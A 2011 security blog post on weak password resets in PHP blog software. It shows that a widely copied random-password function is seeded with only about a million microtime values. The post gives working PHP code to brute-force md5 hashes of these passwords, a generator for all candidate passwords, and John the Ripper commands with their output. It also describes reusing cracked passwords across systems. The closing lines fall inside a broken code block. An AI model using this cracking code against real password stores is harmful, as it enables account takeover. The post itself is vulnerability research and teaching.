---
id: 1058
title: 'Hacking crappy password resets'
date: '2011-03-05T15:46:16-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/2011/1054-revision-4'
permalink: '/?p=1058'
---

Greetings, all!

This is part one of a two-part blog on password resets. For anybody who saw my talk at [Winnipeg Code Camp](http://www.winnipegcodecamp.com/), this will be old news (but hopefully still interesting!)

For this first part, I'm going to take a closer look at some very common (and very flawed) code that I've seen in on a major "snippit" site and contained in at least 5-6 different applications. For the second, I'm going to focus on a single application that does something brutally stupid.

## Password reset?

First off, what is a password reset? This is probably old news, so feel free to skip to the next section for the good stuff.

Many sites offer a feature for users who forgot their passwords. They click a link, and it sends them a temporary password (or, for some sites, it changes their site password to a temporary password, effectively locking out the user till they check their email).

These generally work by generating a one-time password/token/etc, and emailing it to the email address on record. The legitimate user receives the email, and clicks the link/uses the temp password/etc to log back into their account, at which point they ought to change their password (usually, they're forced).

Some reset schemes require the user to answer their "secret questions", which often involves knowing information that nobody else (except Facebook) knows.

Password resets are often a weak point in authentication systems. No matter how good your password policies, login procedures, etc are, a bad password reset can compromise an entire system. Here's a few ways:

- Poorly chosen random passwords
- Poorly validated email addresses
- Relying entirely on secret questions/answers
- Not extending brute-force protection to the reset tokens
- Not extending logging to the reset tokens

The last two points are somewhat interesting, but none of the reset schemes I found in PHP applications used them so I'm not going to cover it.

What I'm going to cover here is the first point - poorly chosen random passwords. So let's do it!

## Methodology

The way I did this research was basically to go to a repository of PHP projects, search for blogs, and download them all. In the end, I downloaded about 20 different blogs. Of them (note: these are from memory):  
\- 10 had no accounts, passwords, or the ability to recover passwords  
\- 6 used a password-reset function that is very common (and can be found on snippits sites)  
\- 2 emailed back the passwords in plaintext  
\- 1 used a braindead reset scheme

## Motivation

Let's say you compromise a site (for a legitimate and ethical penetration test, of course). You wind up with 1,000,000 accounts from a database that happens to use this password generation technique (either for resets or for generating initial passwords). Rather than wasting time cracking these passwords, you want to eliminate every "generated" password from the list. How can you do that?

Or another scenario: you realize that a company's "password generator" utility is using this algorithm to generate "secure" passwords within a company. Knowing that some users are going to misuse this utility, and use the same "strong" passwords on multiple accounts, you compromise a weak site, crack their 14-character random password, then use that to log into their other systems.

How the heck do we crack a 14-character random password, you ask? Let's fine out!

## The code

We're going to focus on the six or so sites that used the common password reset function. Here's the snippit:

```

<?php
  function generate_random_password($length)
  {
    $chars = 'abcdefghijkmnopqrstuvwxyz023456789!@#$';

    srand((double)microtime() * 1000000);

    $passwd = '';
    $chars_length = strlen($chars) - 1;

    for ($i = 0; $i < $length; $i++)
        $passwd .= substr($chars, (rand() % $chars_length), 1);

    return $passwd;
  }
?>
```

At first glance, this didn't look too bad. I was a little disappointed, to be honest. Using srand() in modern PHP versions isn't recommended, but it appears to be seeded with a high-resolution timer - that could make it difficult to guess.

In theory, if you generate a password with strong randomization and a decent length (say, 14 charcter), even with a fast/weak hashing algorithm like md5 it'll be nearly impossible to crack. We need a better way!

So, the first thing I did was replace srand() with echo() to find out exactly what that line does:

```

<?php
  for($i = 0; $i < 3; $i++)
  {
    echo((double)microtime() * 1000000);
    echo "\n";
  }
?>
```

Then the output of a few back-to-back runs:

```
$ php srand.php
155118
155198
155213
$ php srand.php
898454
898536
898552
$ php srand.php
673755
673844
673860
```

Hmm! It looks like the random seed is an integer between 0 and 1,000,000. Suddenly, this is a lot easier.

In my next blog, I'm going to look at how we can use commandline tools to do a bruteforce remotely and guess a password this way, but for now let's see how we can crack the passwords using two methods: php and john the ripper.

## Cracking it with PHP

If for whatever reason you only have a single hash that you want to crack, this is by far the easiest way. I basically modified the original function (found above) to take an extra parameter - the hash - and to generate random passwords with different seeds until it finds one that matches. Here's the code:

```
<?php
  function generate_random_password($length, $hash)
  {
    $chars = 'abcdefghijkmnopqrstuvwxyz023456789!@#$';

    for($j = 0; $j < 1000000; $j++)
    {
      srand($j);

      $passwd = '';
      $chars_length = strlen($chars) - 1;

      for ($i = 0; $i < $length; $i++)
          $passwd .= substr($chars, (rand() % $chars_length), 1);

      if(md5($passwd) == $hash)
        return $passwd;
    }
  }?>
```

Basically, we generate all million possible passwords and figure out which one it is. Easy!

I wrote a couple tiny test programs that basically just call those functions to confirm it works:

$ php password\_reset.php 14  
Generated a 14-character, random password: 4fx@xpxtuos6ee (md5: ef949c5bd59359a5403caafa95d3c5f9)  
$ php password\_reset.php 14  
Generated a 14-character, random password: 95h76tio0vbuh4 (md5: 8ad7fa746f82d90bee2bc38783ad7981)  
$ php password\_reset.php 20  
Generated a 20-character, random password: qnhbk95a8m2sqvwrzieb (md5: 1a902b5f425555446186f346a62c7a53)

Now normally, all three of these would be impossible to crack. Even a 14-character password, made up of 38 individual characters, has 13,090,925,539,866,773,438,464 different possibilities. Fortunately, the srand() only has a million seeds, and a million is definitely bruteforceable!

We've already seen the function to crack the passwords, so let's try it out:

```
$ php ./password_reset_crack.php 14 ef949c5bd59359a5403caafa95d3c5f9
The password is: 4fx@xpxtuos6ee
$ php ./password_reset_crack.php 14 8ad7fa746f82d90bee2bc38783ad7981
The password is: 95h76tio0vbuh4
$ php ./password_reset_crack.php 20 1a902b5f425555446186f346a62c7a53
The password is: qnhbk95a8m2sqvwrzieb
```

And it isn't slow, either:

```
$ time php ./password_reset_crack.php 20 1a902b5f425555446186f346a62c7a53
The password is: qnhbk95a8m2sqvwrzieb

real    0m3.732s
user    0m3.709s
sys     0m0.005s
```

So basically, we cracked a 20-character "random" password in under 4 seconds, w00t! (or, to quote a new friend, "WOOPWOOPWOOPWOOP")

## Cracking with john

Let's say that instead of three passwords, you have a thousand. In fact, let's generate a whole bunch! You can get them (TODO) here to try this yourself! The file contains 5000 passwords in raw-md5 format (with a few duplicates thanks in part to the Birthday Paradox). We're going to use john the ripper 1.7.6 with the Jumbo patch to try cracking them. By default, john fails miserably:

```

$ ./john --format=raw-md5 ./14_character_hashes.txt
Loaded 5000 password hashes with no different salts (Raw MD5 [raw-md5 64x1])
guesses: 0  time: 0:00:00:31 (3)  c/s: 20900M  trying: tenoeuf - tenoey5
Session aborted
```

Even at 20,000,000,000 checks/second, it's getting nothing. I can leave it all day and it will get nothing. These passwords are pretty much impossible to crack with brute force.

Now let's let john in on the secret and tell it the 1,000,000 possible passwords!

The first thing we do is write a quick php application to generate them:

```
<?php
  function generate_random_password($length)
  {
    $chars = 'abcdefghijkmnopqrstuvwxyz023456789!@#$';

    for($j = 0; $j < 1000000; $j++)
    {
      srand($j);
      $passwd = '';
      $chars_length = strlen($chars) - 1;

      for ($i = 0; $i < $length; $i++)
          $passwd .= substr($chars, (rand() % $chars_length), 1);
      echo $passwd . "\n";
    }
  }

  generate_random_password($argv[1]);
?>
```

Then run it to prove it works:

```
$ php ./generate_plaintext.php 14 | head
!@fju@5qx7@s4r
!@fju@5qx7@s4r
we#hqgerz4@oro
2zyemt2h7caer2
rwm!2mdw4!yatk
tzd!nz@!njsyso
tgkzg60k!k!84p
jwnmnd4#eo8@!r
s@4cbh0ki7j@qz
avxgx#5qv0y2tw
```

And send its output into a file:

```

$ php ./generate_plaintext.php 14 > 14_character_plaintexts.txt
```

Then we send that file into john and watch the magic...

```

$ rm john.pot
$ ./john --stdin --format=raw-md5 14_character_hashes.txt 
<p>As you can see, it loaded 4231 password hashes (there were less than 5000 due to collisions). and cracked them all. And it took 0 seconds. that's pretty darn good!</p>
<h2>Conclusion</h2>
<p>Now you've seen how we can very quickly crack a password generated with a bad algorithm. In my next blog, we'll see how we can crack one generated with an even worse algorithm, remotely! </p>
```